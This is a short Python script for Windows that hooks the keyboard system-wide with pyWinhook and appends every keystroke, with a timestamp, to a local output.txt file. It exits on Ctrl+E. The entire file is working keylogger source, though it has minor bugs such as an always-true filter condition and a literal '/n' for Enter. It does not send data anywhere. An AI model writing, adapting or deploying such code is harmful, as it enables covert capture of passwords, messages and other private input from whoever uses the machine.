from datetime import datetime
import win32console
import os
import pythoncom
import pyWinhook
import sys


win = win32console.GetConsoleWindow()


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        sys.exit(1)

    if event.Ascii != 0 or event.Ascii != 8:
        fname = os.getcwd() + "\output.txt"
        now = datetime.now()
        buffer = "{}\n".format(now)
        if os.path.exists(fname):
            with open(fname, 'r+') as f:
                buffer = f.read()
                f.truncate()
                f.close()
        f = open(fname, 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()

    return 1


def main():
    hm = pyWinhook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()
